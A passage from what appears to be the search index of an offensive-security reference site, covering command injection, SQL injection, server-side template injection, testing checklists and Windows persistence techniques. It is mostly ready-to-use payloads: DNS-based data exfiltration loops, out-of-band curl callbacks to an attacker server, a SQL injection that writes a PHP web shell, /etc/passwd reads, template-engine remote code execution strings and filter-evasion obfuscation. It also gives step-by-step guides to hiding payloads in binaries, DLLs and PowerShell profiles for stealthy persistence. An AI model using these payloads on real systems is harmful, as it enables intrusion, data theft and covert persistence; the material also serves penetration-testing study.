<code>ls${LS_COLORS:10:1}${IFS}id</code> Uses environment variables and IFS to inject commands."},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/Command-Injection/#data-exfiltration","title":"Data Exfiltration","text":""},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/Command-Injection/#time-based-data-exfiltration","title":"Time-Based Data Exfiltration","text":"Technique Description <code>time if [ $(whoami cut -c 1) == s ]; then sleep 5; fi</code>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/Command-Injection/#dns-based-data-exfiltration","title":"DNS-Based Data Exfiltration","text":"Technique Description <code>for i in $(ls /) ; do host \"$i.example.com\"; done</code> Uses DNS queries to exfiltrate data. <code>$(host $(wget -h\\|head -n1\\|sed 's/[ ,]/-/g'\\|tr -d '.').example.com)</code> Exfiltrates data using DNS and <code>wget</code>."},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/Command-Injection/#filtering-bypass-techniques","title":"Filtering Bypass Techniques","text":""},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/Command-Injection/#windows-specific","title":"Windows-Specific","text":"Technique Description <code>powershell C:**2\\n??e*d.*?</code> Bypasses filters using wildcard characters in PowerShell. <code>@^p^o^w^e^r^shell c:**32\\c*?c.e?e</code> Executes calc using obfuscated PowerShell command."},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/Command-Injection/#unix-specific","title":"Unix-Specific","text":"Technique Description <code>ls${LS_COLORS:10:1}${IFS}id</code> Uses environment variables and IFS to inject commands. <code>$(ls)</code> Executes command within <code>$()</code>."},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/SQLi/","title":"SQL Injection (SQLI)","text":""},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/SQLi/#introduction","title":"Introduction","text":"<p>SQL injection is a vulnerability that occurs when an attacker inserts or \"injects\" malicious SQL code into a database query. This is typically done through user input areas like forms or URLs that are not properly secured. By manipulating the SQL statements, the attacker can gain unauthorized access to the database, allowing them to view, modify, or delete data. This type of attack exploits inadequate input validation and can lead to significant data breaches.</p> <pre><code>sequenceDiagram\n    participant A as Attacker\n    participant B as Web Application\n    participant C as Database\n\n    A-&gt;&gt;B: 1. Sends SQL Injection Payload\n    Note over B,C: The web app fails to sanitize input\n    B-&gt;&gt;C: 2. Constructs and sends SQL query with payload\n    C--&gt;&gt;B: 3. Executes malicious SQL query\n    Note over C,B: Database processes the injection\n    C--&gt;&gt;B: 4. Returns query result\n    B--&gt;&gt;A: 5. Sends response with data to Attacker</code></pre>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/SQLi/#general-mysql-commands","title":"General MySQL Commands","text":"<p>These commands enable interactions with a MySQL database, including connection setup, navigation, and basic data operations.</p> Command Description <code>mysql -u root -h [TARGET_IP_ADDRESS] -P 3306 -p</code> Connects to a MySQL database as the <code>root</code> user at a specified host and port. <code>SHOW DATABASES;</code> Lists all databases on the MySQL server for database selection. <code>USE users;</code> Selects the 'users' database for current operations. <code>SHOW TABLES;</code> Displays tables in the active database to outline the data structure. <code>DESCRIBE logins;</code> Shows structure and properties of the 'logins' table, including column data types."},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/SQLi/#table-and-data-manipulation","title":"Table and Data Manipulation","text":"<p>This section focuses on the creation, modification, and population of database tables.</p> Command Description <code>CREATE TABLE logins (id INT, ...);</code> Creates a 'logins' table with defined columns and data types. <code>INSERT INTO table_name VALUES (value_1, ...);</code> Adds a new row with values in the defined order to a table. <code>INSERT INTO table_name (column2, ...) VALUES (column2_value, ...);</code> Inserts data into specific columns of a table. <code>UPDATE table_name SET column1=newvalue1, ... WHERE condition;</code> Updates records in a table based on a given condition."},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/SQLi/#sql-injection-techniques-and-payloads","title":"SQL Injection Techniques and Payloads","text":"<p>A clear and concise overview of SQL injection methods from simple attacks to complex exploitations using tools like sqlmap.</p> Technique Payload Description Basic Union Attack <code>' UNION SELECT 1,2,3,4 -- -</code> Demonstrates a simple SQL injection with a UNION SELECT. Write File <code>cn' union select 1,'file written successfully!',3,4,5 into outfile '/var/www/html/proof.txt'-- -</code> Writes data to a file on the server, showing file system access. PHP Web Shell <code>cn' union select \"\",'&lt;?php system($_REQUEST[0]); ?&gt;', \"\", \"\", \"\" into outfile '/var/www/html/shell.php'-- -</code> Creates a web shell for command execution via PHP code. sqlmap Data Dump <code>sqlmap -r request.txt --batch --dump</code> Automates SQL injection to dump database contents with sqlmap. Targeted sqlmap Scan <code>sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read=\"/var/www/blah.php\"</code> Targets specific details with sqlmap for sensitive data retrieval. Form Injection Test <code>sqlmap -o -u \"http://[DOMAIN-NAME]/form/\" \u2013forms</code> Tests form parameters for SQL injection vulnerabilities using sqlmap. Database &amp; Table Data Dump <code>sqlmap -o -u \"http://[DOMAIN-NAME]/vuln-form\" --forms -D database-name -T users \u2013dump</code> Extracts and cracks hashes from specified database tables. Session Flush <code>sqlmap --flush session</code> Resets sqlmap's session data to clear the testing environment. Boolean Exploitation <code>sqlmap -p user --technique=B</code> Uses boolean techniques for SQL injection exploitation. Crawl and Scan <code>sqlmap -u http://[DOMAIN-NAME] --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3</code> Performs a comprehensive crawl and test for SQL injection on a website."},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/SQLi/#sql-injection-bypass-payloads","title":"SQL INJECTION Bypass Payloads","text":"<p>Different SQL injection payloads designed to manipulate or bypass login page.</p> Technique Payload Description Basic Authentication Bypass <code>' OR '1'='1</code> Bypasses authentication by always returning true. Extended Rights <code>' OR '1'='1'--</code> Ends the query prematurely to succeed the authentication check. Admin Access <code>' OR '1'='1' AND userType='admin</code> Attempts to escalate privileges by setting userType to 'admin'. Time-Based Blind SQLi <code>admin' AND (SELECT * FROM Users WHERE username='admin' AND SLEEP(10))--</code> Infers valid usernames by delaying the response when true. Union-Based Credential Extraction <code>' UNION SELECT username, password FROM users--</code> Extracts user credentials directly from the database. Error-Based SQLi <code>' OR 1=1; RAISERROR ('Login Error', 10, 1);--</code> Disrupts normal error handling to disclose information. Commenting Out Remaining SQL <code>' OR '1'='1' /*</code> Neutralizes the rest of the SQL command for effective manipulation. Complex Payload with Encoding <code>' OR ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1))) &gt; 116 --</code> Derives schema details through boolean responses or error messages."},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/SQLi/#output-formatting-for-analysis","title":"Output Formatting for Analysis","text":"<p>Methods for optimizing data retrieval and presentation for clearer analysis and reporting.</p> Command Description <code>SELECT * FROM table_name WHERE condition;</code> Displays rows matching a specific condition, showing all columns. <code>SELECT column1, column2 FROM table_name;</code> Displays only selected columns, streamlining the output. <code>SELECT * FROM logins ORDER BY column_1 DESC;</code> Orders 'logins' table data by 'column_1' in descending order. <code>SELECT * FROM logins LIMIT 2 OFFSET 1;</code> Shows a subset of records, skipping the first and displaying the next two."},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/SSTI/","title":"Server-Side Template Injection (SSTI)","text":"<pre><code>sequenceDiagram\n    participant A as Attacker\n    participant B as Web Server\n    participant C as Template Engine\n    participant U as User\n\n    A-&gt;&gt;B: 1. Sends SSTI Payload\n    B-&gt;&gt;C: 2. Passes Input to Template Engine\n    C--&gt;&gt;B: 3. Executes Template Code with Payload\n    B--&gt;&gt;U: 4. Sends Response with Rendered Output</code></pre>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/SSTI/#introduction","title":"Introduction","text":"<p>Server-Side Template Injection (SSTI) is a vulnerability that accurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. SSTI can lead to Remote Code Execution (RCE) on the server.</p>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/SSTI/#detection-techniques","title":"Detection Techniques","text":"Technique Description Fuzzing the Template Inject special characters (e.g., <code>${{&lt;%[%'\"}}%\\)</code> into the template and analyze differences in server responses compared to regular data. Error Responses Look for thrown errors that reveal the vulnerability and potentially identify the template engine. Reflection Analysis Check if the payload is absent in the reflection, or parts of it are missing, implying the server processes it differently than regular data. Plaintext Context Verify if the server evaluates template expressions (e.g., <code>{{7*7}}</code>, <code>${7*7}</code>) to distinguish from XSS."},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/SSTI/#jinja2-python","title":"Jinja2 (Python)","text":"Description Code Output Payload <code>{{7*7}}</code> Returns 49 RCE Example <code>{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}</code> Output of ls command Sandbox Escape <code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}</code> Content of /etc/passwd"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/SSTI/#twig-php","title":"Twig (PHP)","text":"Description Code Output Payload <code>{{7*7}}</code> Returns 49 RCE Example <code>{{ dump(app.request.server.all) }}</code> Dumps server variables Sandbox Escape <code>{{ _self.env.registerUndefinedFilterCallback(\"exec\") }}{{ _self.env.getFilter(\"id\") }}</code> Executes id command"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/SSTI/#smarty-php","title":"Smarty (PHP)","text":"Description Code Output Payload <code>{math equation=\"x * y\" x=7 y=7}</code> Returns 49 RCE Example <code>{php}echo shell_exec('ls'){/php}</code> Output of ls command Sandbox Escape <code>{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME, $exploit_code, $smarty)};</code> Writes and executes exploit code"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/SSTI/#erb-ruby","title":"ERB (Ruby)","text":"Description Code Output Payload <code>&lt;%= 7 * 7 %&gt;</code> Returns 49 RCE Example <code>&lt;%= system('ls') %&gt;</code> Output of ls command Sandbox Escape Not typically sandboxed, but depends on configuration N/A"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/SSTI/#freemarker-java","title":"FreeMarker (Java)","text":"Description Code Output Payload <code>${7*7}</code> Returns 49 RCE Example <code>${\"freemarker.template.utility.Execute\"?new()(\"id\")}</code> Output of id command Sandbox Escape <code>${product.getClass().getDeclaredMethods()[0].invoke(product, null)}</code> Invokes method on product"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/Checklist/Command-Injection/","title":"OS Command Injection","text":"<ol> <li> <p>Initial Information Gathering </p> <ul> <li> Identify and map all endpoints that accept user input which could be used to execute system commands.</li> <li> Review source code (if available) to understand how user inputs are handled.</li> <li> Check for user inputs in URLs, form fields, headers, and request bodies that interact with the operating system.</li> </ul> </li> <li> <p>Basic Command Injection Testing</p> <ol> <li>Test with simple command injection payloads to identify vulnerabilities:<ul> <li> <code>; ls</code></li> <li> <code>| ls</code></li> <li> <code>&amp;&amp; ls</code></li> <li> <code>|| ls</code></li> <li> <code>$(ls)</code></li> </ul> </li> </ol> </li> <li> <p>Advanced Command Injection Techniques</p> <ol> <li>Test for bypassing input validation and filtering:<ul> <li> <code>; cat /etc/passwd</code></li> <li> <code>| cat /etc/passwd</code></li> <li> <code>&amp;&amp; cat /etc/passwd</code></li> <li> <code>|| cat /etc/passwd</code></li> <li> <code>$(cat /etc/passwd)</code></li> </ul> </li> <li>Use encoding to bypass filters:<ul> <li> URL encoding: <code>%3B%20ls</code></li> <li> Double URL encoding: <code>%253B%2520ls</code></li> <li> Base64 encoding: <code>Y2F0IC9ldGMvcGFzc3dk</code></li> </ul> </li> <li>Test for time delay to identify blind command injection:<ul> <li> <code>; sleep 10</code></li> <li> <code>| sleep 10</code></li> <li> <code>&amp;&amp; sleep 10</code></li> <li> <code>|| sleep 10</code></li> <li> <code>$(sleep 10)</code></li> </ul> </li> </ol> </li> <li> <p>Out-of-Band (OOB) Command Injection</p> <ol> <li>Set up an OOB endpoint to detect blind command injection:<ul> <li> <code>; curl http://[YOUR_SERVER]/ping</code></li> <li> <code>| curl http://[YOUR_SERVER]/ping</code></li> <li> <code>&amp;&amp; curl http://[YOUR_SERVER]/ping</code></li> <li> <code>|| curl http://[YOUR_SERVER]/ping</code></li> <li> <code>$(curl http://[YOUR_SERVER]/ping)</code></li> <li> <code>\\curl http://[YOUR_SERVER]/ping</code></li> </ul> </li> </ol> </li> <li> <p>Command Injection in Different Contexts</p> <ol> <li>Test command injection in file paths:<ul> <li> <code>/path/to/file; ls</code></li> <li> <code>/path/to/file| ls</code></li> <li> <code>/path/to/file&amp;&amp; ls</code></li> </ul> </li> <li>Test command injection in environment variables:<ul> <li> <code>ENV_VAR=\"value; ls\"</code></li> <li> <code>ENV_VAR=\"value| ls\"</code></li> <li> <code>ENV_VAR=\"value&amp;&amp; ls\"</code></li> </ul> </li> <li>Test command injection in configuration files:<ul> <li> <code>config_option=value; ls</code></li> <li> <code>config_option=value| ls</code></li> <li> <code>config_option=value&amp;&amp; ls</code></li> </ul> </li> </ol> </li> <li> <p>Error Handling and Response Analysis</p> <ul> <li> Analyze server responses for clues about command injection vulnerabilities.</li> <li> Look for error messages that disclose command execution results or system information.</li> <li> Verify if application stack traces are exposed in responses.</li> </ul> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/Checklist/SQLi/","title":"SQL Injection (SQLi)","text":"<ol> <li> <p>Entry Point Detection</p> <ul> <li> Identify potential SQL injection entry points in the application.</li> <li> Check input fields, URL parameters, headers, cookies, and other data entry points.</li> </ul> </li> <li> <p>Testing Techniques</p> <ul> <li> Test with simple characters (e.g., ', \", ;, --, /* */) to see basic SQL injection response.</li> <li> Use multiple encoding layers (e.g., URL encoding, Base64) to assess filter bypass capabilities.</li> <li> Try merging characters to form unexpected SQL queries (e.g., <code>' OR 1=1 --</code>).</li> <li> Perform logical testing to see how the application handles SQL logic (e.g., <code>AND 1=1</code>, <code>OR 1=1</code>).</li> <li> Include special characters (e.g., @, #, $, ^, *, (, )) to test input sanitization processes.</li> <li> Test for second-order SQL injection by modifying input that is later processed in SQL queries.</li> </ul> </li> <li> <p>Detection and Evasion</p> <ol> <li>Automated SQL Injection Detection &amp; WAF Evasion Techniques <ul> <li> Run SQL injection scanner on all requests to detect vulnerabilities.</li> <li> Attempt to bypass Web Application Firewalls (WAF) with advanced techniques:</li> <li> Using Null byte before SQL query.</li> <li> Using SQL inline comment sequence (--, /* */).</li> <li> Employ URL encoding to obfuscate malicious inputs.</li> <li> Alternate between changing cases (uppercase/lowercase) to evade case-sensitive filters.</li> <li> Use SQLMAP tamper scripts to automate evasion tactics.</li> <li> Use time delays and error messages to infer SQL injection (e.g., <code>AND 1=BENCHMARK(10000000,MD5(1))</code>).</li> </ul> </li> <li>Time-Based SQL Injection:<ul> <li> Oracle: Test with dbms_pipe.receive_message(('a'), 10).</li> <li> Microsoft: Use WAITFOR DELAY '0:0:10'.</li> <li> PostgreSQL: Execute SELECT pg_sleep(10).</li> <li> MySQL: Perform SELECT sleep(10).</li> </ul> </li> <li>Conditional Delays for Blind SQL Injection:<ul> <li> Oracle: SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'), 10) ELSE NULL END FROM dual.</li> <li> Microsoft: IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'.</li> <li> PostgreSQL: SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END.</li> <li> MySQL: SELECT IF(YOUR-CONDITION-HERE, sleep(10), 'a').</li> </ul> </li> <li> <p>Boolean-Based SQL Injection:</p> <ul> <li> Oracle: SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'true' ELSE 'false' END FROM dual.</li> <li> Microsoft: IF (YOUR-CONDITION-HERE) SELECT 'true' ELSE SELECT 'false'.</li> <li> PostgreSQL: SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'true' ELSE 'false' END.</li> <li> MySQL: SELECT IF(YOUR-CONDITION-HERE, 'true', 'false').</li> </ul> </li> <li> <p>Error-Based SQL Injection</p> <ul> <li> General: Inject payloads to generate SQL errors (e.g., <code>' OR 1=1 --, \"</code>).</li> </ul> </li> <li> <p>General SQL Injection Testing</p> <ul> <li> Test SQL Injection on authentication forms (<code>login</code>, <code>registration</code>).</li> <li> Test SQL Injection on the search bar.</li> <li> Test SQL Injection on editable characteristics (<code>profile updates</code>, <code>comments</code>).</li> <li> Use tools like <code>SQLmap</code>, <code>Burp Suite</code>, or <code>Hackbar</code>.</li> <li> Use Google dorks to find the SQL keywords and potential vulnerable sites.</li> <li> Test all types of SQL Injection (<code>GET</code>, <code>POST</code>, <code>COOKIE</code>, <code>HEADER</code>).</li> <li> Try SQL Injection with various methods like null bytes, URL encoding, case changes, and tamper scripts.</li> <li> Try SQL Injection with SQL Time delay and conditional delays.</li> <li> Try Boolean-based, Time-based, and Error-based SQL Injection techniques.</li> <li> Test for out-of-band SQL injection to capture data sent to an external server.</li> </ul> </li> </ol> </li> <li> <p> Techniques</p> <ul> <li> Test for stacked queries (e.g., ; <code>DROP TABLE users;--</code>).</li> <li> Check for union-based SQL injection (e.g., <code>UNION SELECT NULL, username, password FROM users--</code>).</li> <li> Test for subqueries and nested queries.</li> <li> Assess the application's use of parameterized queries and stored procedures.</li> <li> Verify if error handling reveals sensitive database information.</li> <li> Perform fuzz testing on all SQL query parameters.</li> </ul> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/Checklist/SSTI/","title":"Server-Side Template Injection (SSTI)","text":"<ol> <li> <p>Initial Information Gathering</p> <ul> <li> Identify and map all endpoints that accept user input for template rendering.</li> <li> Review source code (if available) to understand template rendering mechanisms.</li> <li> Check for user inputs in templates, URLs, headers, and request bodies.</li> </ul> </li> <li> <p>Basic SSTI Testing</p> <ul> <li>Test common SSTI payloads to identify template engine and injection points:<ul> <li> <code>{{7*7}}</code></li> <li> <code>${7*7}</code></li> <li> <code>&lt;%= 7 * 7 %&gt;</code></li> <li> <code>#{7*7}</code></li> <li> Try injecting payloads in different user inputs (e.g., form fields, query parameters).</li> </ul> </li> </ul> </li> <li> <p>Detecting Template Engines</p> <ul> <li>Identify the template engine by using specific payloads for known engines:<ol> <li>Jinja2 (Python):<ul> <li> <code>{{7*'7'}}</code></li> <li> <code>{{config.items()}}</code></li> </ul> </li> <li>Twig (PHP):<ul> <li> <code>{{7*7}}</code></li> <li> <code>{{_self.env.globals}}</code></li> </ul> </li> <li>Freemarker (Java):<ul> <li> <code>${7*7}</code></li> <li> <code>${\"freemarker.template.utility.Execute\"?new()}</code></li> <li> <code>&lt;#assign ex = \"freemarker.template.utility.Execute\"?new()&gt;</code></li> </ul> </li> <li>Velocity (Java):<ul> <li> <code>#set($x = 7 * 7)</code></li> <li> <code>$class.inspect(\"java.lang.Runtime\").newInstance().exec(\"ls\")</code></li> </ul> </li> <li>Smarty (PHP):<ul> <li> <code>{$smarty.version}</code></li> <li> <code>{if 7*7}</code></li> </ul> </li> <li>Thymeleaf (Java):<ul> <li> <code>${7*7}</code></li> <li> <code>th:text=\"${T(java.lang.Runtime).getRuntime().exec('ls')}\"</code></li> </ul> </li> </ol> </li> </ul> </li> <li> <p>Payloads</p> <ul> <li>Test payloads that can bypass filters and restrictions:<ul> <li> <code>{{7*'7'}}</code></li> <li> <code>${7*'7'}</code></li> <li> <code>&lt;%= 7 * '7' %&gt;</code></li> </ul> </li> <li> Use concatenation to bypass filters: <code>{{7*('7')}}</code>, <code>${7*('7')}</code></li> <li> Inject payloads in nested contexts to test for complex injections.</li> </ul> </li> <li> <p>Exploiting SSTI</p> <ul> <li>Test for code execution:<ul> <li> Python (Jinja2): <code>{{config.from_object('os').popen('ls').read()}}</code></li> <li> PHP (Twig):  <code>{{_self.env.globals.system('ls')}}</code></li> <li> Java (Freemarker): <code>&lt;#assign ex = \"freemarker.template.utility.Execute\"?new()&gt; ${ex(\"ls\")}</code></li> <li> Java (Velocity): <code>#set($x = \"freemarker.template.utility.Execute\") $x.new().exec(\"ls\")</code></li> <li> PHP (Smarty): <code>{system('ls')}</code></li> <li> Java (Thymeleaf): <code>th:text=\"${T(java.lang.Runtime).getRuntime().exec('ls')}\"</code></li> </ul> </li> </ul> </li> <li> <p>Bypassing Input Validation</p> <ul> <li>Test for input validation bypass using encoding and escaping:<ul> <li> URL encoding: <code>%7B%7B7*7%7D%7D</code></li> <li> HTML encoding: <code>&amp;#123;&amp;#123;7*7&amp;#125;&amp;#125;</code></li> </ul> </li> <li>Use different template syntax to bypass filters:<ul> <li> <code>{{7*7}}</code></li> <li> <code>${7*7}</code></li> <li> <code>&lt;%= 7 * 7 %&gt;</code></li> </ul> </li> </ul> </li> <li> <p>Error Handling and Response Analysis</p> <ul> <li> Analyze server responses for clues about SSTI vulnerabilities.</li> <li> Look for error messages that disclose template engine details or execution errors.</li> <li> Verify if application stack traces are exposed in responses.</li> </ul> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Code-Cave-Exploitation/","title":"Code Cave Exploitation","text":""},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Code-Cave-Exploitation/#establishing-persistence-using-code-cave-exploitation","title":"Establishing Persistence Using Code Cave Exploitation","text":"<p>Code cave exploitation leverages unused sections of a program\u2019s executable memory (code caves) to insert and run malicious code. This allows persistence by hiding within legitimate binaries, making detection and removal more difficult.</p>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Code-Cave-Exploitation/#step-1-finding-a-code-cave","title":"Step 1: Finding a Code Cave","text":"<ol> <li> <p>Install a Binary Analysis Tool    Use tools such as CFF Explorer, PE-bear, or IDA Pro to analyze executables and locate unused memory regions.  </p> </li> <li> <p>Open the Target Executable    Load the executable you intend to modify into the analysis tool.  </p> </li> <li> <p>Search for Unused Sections    Identify sections filled with consecutive null bytes (<code>00</code>). These represent potential code caves where payloads can be injected.  </p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Code-Cave-Exploitation/#step-2-preparing-the-malicious-code","title":"Step 2: Preparing the Malicious Code","text":"<ol> <li> <p>Develop the Payload    Write a compact payload small enough to fit within the chosen code cave.  </p> </li> <li> <p>Compile to Raw Binary    Compile the payload in raw binary format that matches the target\u2019s architecture (x86 or x64).  </p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Code-Cave-Exploitation/#step-3-injecting-the-code","title":"Step 3: Injecting the Code","text":"<ol> <li> <p>Back Up the Original Executable    Always create a backup to prevent accidental corruption.  </p> </li> <li> <p>Insert the Payload    Use a hex editor or patching tool to overwrite the null bytes with your binary payload. Ensure you stay within the available space.  </p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Code-Cave-Exploitation/#step-4-redirecting-execution-flow","title":"Step 4: Redirecting Execution Flow","text":"<ol> <li> <p>Locate an Injection Point    Choose a place in the original code (e.g., function call or entry point) to redirect execution to your code cave.  </p> </li> <li> <p>Patch a Jump Instruction or Entry Point    Modify an instruction or the executable\u2019s entry point so that execution flows into your injected code.  </p> </li> <li> <p>Return to Legitimate Execution    Ensure your payload includes instructions to return control back to the original code to avoid breaking functionality.  </p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Code-Cave-Exploitation/#step-5-testing","title":"Step 5: Testing","text":"<ol> <li> <p>Run in a Controlled Environment    Test the modified binary in a lab or sandbox to ensure stability and stealth.  </p> </li> <li> <p>Validate Persistence    Confirm the executable continues its normal behavior while also executing your injected payload, and check detection evasion.  </p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/Code-Cave-Exploitation/#step-6-cleanup-and-deployment","title":"Step 6: Cleanup and Deployment","text":"<ol> <li> <p>Finalize Integration    Adjust payload placement or jump offsets as needed to improve stability and stealth.  </p> </li> <li> <p>Prepare for Deployment    Only deploy in authorized environments, following ethical guidelines and legal restrictions.  </p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/DLL-Hijacking/","title":"DLL Hijacking","text":""},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/DLL-Hijacking/#establishing-persistence-using-dll-hijacking","title":"Establishing Persistence Using DLL Hijacking","text":"<p>DLL hijacking takes advantage of the way Windows applications search for and load Dynamic Link Libraries (DLLs). Below is a detailed explanation of the commands and technical steps involved in setting up a DLL hijacking scenario:</p>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/DLL-Hijacking/#step-1-identifying-vulnerable-applications-and-dlls","title":"Step 1: Identifying Vulnerable Applications and DLLs","text":"<ol> <li>Download and run Process Monitor.  </li> <li>Set up a filter to observe the DLL loading behavior of the target application.  </li> <li>Look for entries that indicate a DLL is being searched for but not found, or one that is loaded from a non-specific path.    Example filter: <code>Filter -&gt; Category -&gt; Path -&gt; contains -&gt; .dll</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/DLL-Hijacking/#step-2-creating-the-malicious-dll","title":"Step 2: Creating the Malicious DLL","text":"<ol> <li>Write C++ code that performs the desired action when the DLL is loaded. Below is an example that displays a basic message box when loaded (to be adapted for actual use):</li> </ol> <p>```c++     #include  <pre><code>BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {\n    switch (fdwReason) {\n    case DLL_PROCESS_ATTACH:\n        MessageBoxW(NULL, L\"DLL has been injected!\", L\"DLL Hijacking\", MB_OK);\n        break;\n    }\n    return TRUE;\n}\n```\n</code></pre> <ol> <li>Use a command line compiler like MinGW or Visual Studio <code>cl</code> command to compile the DLL. <code>cl /LD MaliciousDll.cpp /Fe:MaliciousDll.dll</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/DLL-Hijacking/#step-3-placing-the-malicious-dll","title":"Step 3: Placing the Malicious DLL","text":"<ol> <li>Depending on the DLL search order and your access rights, place the DLL in a directory that will be searched before the legitimate DLL\u2019s usual directory.</li> <li>Common locations to test include the application\u2019s directory or directories listed in the system <code>PATH</code>. <code>copy MaliciousDll.dll C:\\Path\\To\\Target\\Application\\</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/DLL-Hijacking/#step-4-triggering-the-exploit","title":"Step 4: Triggering the Exploit","text":"<ol> <li>Simply starting the application normally should trigger the loading of your malicious DLL, if placed correctly. <code>start \"\" \"C:\\Path\\To\\Target\\Application\\Application.exe\"</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/DLL-Hijacking/#step-5-monitoring-and-cleanup","title":"Step 5: Monitoring and Cleanup","text":"<ol> <li>Reopen Process Monitor and check for the loading event of your <code>MaliciousDll.dll</code>.</li> <li>Ensure that your message box or other indicators of execution appear as expected.</li> <li>Remove the malicious DLL from the directory to prevent further execution and to clean up the environment. <code>del C:\\Path\\To\\Target\\Application\\MaliciousDll.dll</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/PowerShell-Profile/","title":"PowerShell Profile","text":""},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/PowerShell-Profile/#establishing-persistence-via-powershell-profile","title":"Establishing Persistence via PowerShell Profile","text":"<p>PowerShell profiles are scripts that run at the start of a PowerShell session. They can be leveraged to establish persistence on a system.</p>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/PowerShell-Profile/#step-1-understanding-powershell-profiles","title":"Step 1: Understanding PowerShell Profiles","text":"<p>PowerShell supports several profile scripts that execute automatically whenever PowerShell starts. The most commonly targeted for persistence is the All Users profile, which affects every user on the system.</p> <ol> <li>Find the profile paths by running: <code>$PROFILE | Select-Object *</code></li> <li>This will display all profile paths, including the AllUsersAllHosts profile, which is typically located at: <code>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/PowerShell-Profile/#step-2-checking-if-powershell-profiles-are-enabled","title":"Step 2: Checking if PowerShell Profiles Are Enabled","text":"<p>By default, PowerShell script execution may be disabled (Restricted Execution Policy). You need to confirm scripts can be executed.</p> <ol> <li>Check the current execution policy: <code>Get-ExecutionPolicy</code></li> <li>If required and with the necessary permissions, set the execution policy to allow scripts: <code>Set-ExecutionPolicy RemoteSigned -Scope LocalMachine</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/PowerShell-Profile/#step-3-creating-or-modifying-the-powershell-profile","title":"Step 3: Creating or Modifying the PowerShell Profile","text":"<ol> <li>Check if the profile exists: <code>Test-Path $PROFILE.AllUsersAllHosts</code></li> <li>Create the profile if it does not exist: <code>New-Item -Path $PROFILE.AllUsersAllHosts -Type File -Force</code></li> <li>Append commands to the profile script: <code>Add-Content -Path $PROFILE.AllUsersAllHosts -Value 'Write-Host \"PowerShell profile loaded successfully\"'</code></li> <li>Replace the sample <code>Write-Host</code> command with the script or command you want to persist.</li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Establishing-Persistence/PowerShell-Profile/#step-4-testing-the-profile-script","title":"Step 4: Testing the Profile Script","text":"<ol> <li>Start a new PowerShell session.  </li> <li>Verify that the commands you added to the profile execute automatically. For complex scripts, test each step to ensure reliability.</li> 